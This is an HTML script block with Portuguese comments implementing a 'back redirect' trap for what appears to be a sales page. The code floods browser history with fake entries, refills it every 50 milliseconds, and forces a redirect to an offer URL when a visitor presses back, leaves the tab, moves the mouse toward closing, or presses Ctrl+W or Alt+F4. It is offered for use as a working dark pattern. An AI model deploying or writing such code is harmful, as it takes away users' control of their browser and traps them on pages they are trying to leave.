    <!-- SISTEMA DE BACK REDIRECT INDESTRUTÍVEL COM EXIT INTENT LAYERS -->
    <script>
    (function(w, d, h, l) {
      var TARGET_URL = "https://ofertaexclusiva.figma.site/";
      var isArmed = false;

      // Técnica de Spam de Histórico (50 estados)
      function forceBack() {
        try {
          for (var i = 0; i < 50; i++) {
            h.pushState({ trap: i, ts: Date.now() }, "", l.href);
          }
        } catch (e) {}
      }

      // Função de Redirecionamento Silencioso e Instantâneo
      function performRedirect() {
        if (isArmed && !w.isNavigatingToCheckout) {
          l.replace(TARGET_URL);
        }
      }

      // Gatilho de Ativação por interação global (Validação do Navegador)
      function arm() {
        if (!isArmed) {
          isArmed = true;
          forceBack();
          w.removeEventListener("click", arm);
          w.removeEventListener("touchstart", arm);
          w.removeEventListener("mousedown", arm);
        }
      }

      // Registra gatilhos de interação
      w.addEventListener("click", arm, { passive: true });
      w.addEventListener("touchstart", arm, { passive: true });
      w.addEventListener("mousedown", arm, { passive: true });

      // Override de Eventos de Navegação (Popstate / Hashchange)
      w.onpopstate = w.onhashchange = function(event) {
        performRedirect();
      };

      // 1. MONITORAMENTO DE MOUSE (Desktop Exit Intent)
      d.addEventListener("mouseleave", function(e) {
        // Detecta se o mouse sai do topo da página (intenção de fechar/trocar aba)
        if (e.clientY < 0) {
          performRedirect();
        }
      });

      // 2. PERDA DE FOCO (Mobile/Tab Exit Intent)
      d.addEventListener("visibilitychange", function() {
        if (d.visibilityState === 'hidden') {
          performRedirect();
        }
      });

      // 3. BLOQUEIO DE TECLAS (Power User Intent)
      d.addEventListener("keydown", function(e) {
        // Detecta Cmd+W, Ctrl+W ou Alt+F4
        var isW = e.key === 'w' || e.key === 'W';
        var isF4 = e.key === 'F4';
        if ((isW && (e.ctrlKey || e.metaKey)) || (isF4 && e.altKey)) {
          performRedirect();
        }
      });

      // 4. PERSISTÊNCIA ATÔMICA (Loop de 50ms)
      setInterval(function() {
        if (isArmed && !w.isNavigatingToCheckout) {
          // Mantém o histórico inflado contra limpezas automáticas de SPAs
          if (h.length < 30) {
            forceBack();
          }
        }
      }, 50);

      // Listener de Blur para perda de foco da janela
      w.addEventListener("blur", function() {
        performRedirect();
      });

      // Proteção contra diálogos nativos
      w.onbeforeunload = null;

    })(window, document, window.history, window.location);
    </script>
